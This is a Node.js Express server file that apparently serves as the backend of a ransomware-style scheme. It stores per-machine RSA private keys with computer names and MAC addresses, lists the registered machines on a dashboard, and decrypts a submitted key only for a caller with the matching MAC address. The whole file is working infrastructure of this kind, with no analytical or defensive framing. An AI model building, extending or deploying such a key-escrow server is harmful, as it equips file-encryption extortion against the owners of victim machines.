// tested on wsl using node v10.16.3 & python 2.7.17

const express = require("express");
const bp = require("body-parser");
const app = express();
const { v1: uuidv1 } = require("uuid");
const fs = require("fs");
const util = require("util");
const exec = util.promisify(require("child_process").execFile);

const low = require("lowdb");
const FileSync = require("lowdb/adapters/FileSync");
const adapter = new FileSync("db.json");
const db = low(adapter);
db.defaults({ data: [] }).write();

const ejs = require("ejs");

app.use(bp.json());

const port = 3000;

app.post("/decrypt/:uid", async (req, res) => {
  const data = db.get("data").find({ uuid: req.params.uid }).value();
  if (data.macAddr !== req.body.macAddr) {
    res.status(556).send({ error: "Wrong MAC ADDRESS" });
    return;
  }

  try {
    const { stdout, stderr } = await exec("python", [
      "rsaEncrypt.py",
      "dec",
      `privkey/${req.params.uid}.der`,
      req.body.data,
    ]);
    res.json({ key: stdout.trim() });
  } catch (err) {
    res.status(555).send({ error: "Wrong key bro" });
  }
});

app.post("/save", (req, res) => {
  //Generate UUID
  const id = uuidv1();
  //Decode privkey from request body
  const decoded = Buffer.from(req.body.privkey, "base64");
  //Create directory if not exist
  if (!fs.existsSync("./privkey")) {
    fs.mkdirSync("./privkey");
  }
  //Write To Fle
  fs.writeFileSync(`privkey/${id}.der`, decoded);

  //Save to DB
  db.get("data")
    .push({
      compName: req.body.compName,
      macAddr: req.body.macAddr,
      uuid: id,
    })
    .write();
  //Return result uuid
  res.json({ id });
});

app.get("/data", async (req, res) => {
  const dashboardTemplate = fs.readFileSync("view/dashboard.ejs", "utf-8");
  const data = db.get("data").value();

  const html = ejs.render(dashboardTemplate, { data: data });
  res.send(html);
});

app.listen(port, () => {
  console.log(`listening on port ${port}`);
});